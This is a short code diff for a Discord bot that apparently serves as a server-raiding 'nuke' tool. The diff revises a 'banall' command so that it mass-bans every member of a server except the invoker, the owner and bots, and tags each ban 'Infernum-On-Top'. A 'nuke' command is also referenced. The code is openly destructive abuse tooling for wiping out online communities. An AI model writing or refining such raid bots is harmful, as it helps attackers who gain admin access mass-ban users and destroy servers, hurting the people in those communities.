@@ -90,12 +90,15 @@ async def nuke(ctx):
         pass
     
 @bot.command()
+@commands.has_permissions(administrator=True)
 async def banall(ctx):
     await ctx.message.delete()
-    for user in list(ctx.guild.members):
+    for member in ctx.guild.members:
+        if member == ctx.author or member == ctx.guild.owner or member.bot:
+            continue  
         try:
-            await user.ban()
+            await member.ban(reason="Infernum-On-Top")
         except:
-            pass  
+            pass
 
 bot.run("Your bot token here")
